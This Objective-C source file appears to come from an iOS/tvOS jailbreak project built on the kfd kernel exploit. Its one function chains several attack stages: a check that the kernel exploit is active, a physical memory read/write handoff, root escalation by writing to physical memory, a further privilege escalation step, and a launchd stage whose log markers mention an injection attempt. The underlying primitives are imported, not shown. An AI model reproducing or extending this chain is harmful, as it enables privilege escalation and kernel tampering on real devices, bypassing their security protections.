#import "dt_build698_client.h"
#import "dt_kcall_planb.h"
#import "dt_physrw.h"
#import "DTRunLogger.h"
#import "kfd_tvos.h"
#import "dt_kernel_exploit.h"
#import "primitives.h"
#import "kernel.h"

#import <unistd.h>

typedef void (^dt698_log_fn)(NSString *line);

static void dt698_log(dt698_log_fn log, NSString *line)
{
    [[DTRunLogger shared] log:line];
    if (log)
        log(line);
}

static void dt698_emit(dt698_log_fn log, NSString *marker)
{
    dt698_log(log, marker);
    [[DTRunLogger shared] logStage:marker];
}

int dt_build698_run_launchd_wall1_diagnostic(void (^log)(NSString *line), NSString **verdictOut)
{
    dt698_emit(log, @"KCALL698_UI_TAP");
    dt698_emit(log, @"BUILD102698_SCOPE=LAUNCHD_CONTEXT_DIAGNOSTIC_ONLY");
    dt698_emit(log, @"KCALL698_NO_B1_PATCH");
    dt698_emit(log, @"KCALL698_NO_B4_MUTATION");
    dt698_emit(log, @"KCALL698_NO_AMFI_HOOK");
    dt698_emit(log, @"KCALL698_NO_USERREBOOT");
    dt698_emit(log, @"KCALL698_ONE_OPAINJECT_ATTEMPT_ONLY");
    dt698_emit(log, @"KCALL698_LOCAL_DLOPEN_WARMUP_ONLY_NOT_WALL1_TEST");

    if (!dt_kernel_exploit_is_active()) {
        if (verdictOut)
            *verdictOut = @"KCALL698_KFD_INACTIVE";
        return -1;
    }

    if (dt_build_physrw_handoff_only(log) != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL698_PHYSRW_FAIL";
        return -2;
    }

    if (getuid() != 0) {
        uint64_t proc = proc_find(getpid());
        if (proc && dt_build_phys_root_esc(proc, log) == 0 && getuid() == 0) {
            dt698_log(log, @"[+] build698 root esc OK uid=0");
        }
        if (proc)
            proc_rele(proc);
    }

    if (getuid() != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL698_ROOT_FAIL";
        return -3;
    }

    int priv_r = -1;
    uint64_t self_proc = proc_find(getpid());
    if (self_proc) {
        priv_r = dt_build97_privesc_preserve_slot0(self_proc, log);
        proc_rele(self_proc);
    }
    if (priv_r != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL698_BUILD97_FAIL";
        return -4;
    }

    NSString *kernelVerdict = nil;
    int r = dt698_run_launchd_wall1_diagnostic(log, &kernelVerdict);
    if (r != 0) {
        if (verdictOut)
            *verdictOut = kernelVerdict ?: @"BUILD102698_DIAGNOSTIC_FAIL";
        return r;
    }

    if (verdictOut)
        *verdictOut = kernelVerdict ?: @"BUILD102698_DIAGNOSTIC_COMPLETE";
    dt698_emit(log, @"KCALL698_PHASE_PASS");
    return 0;
}
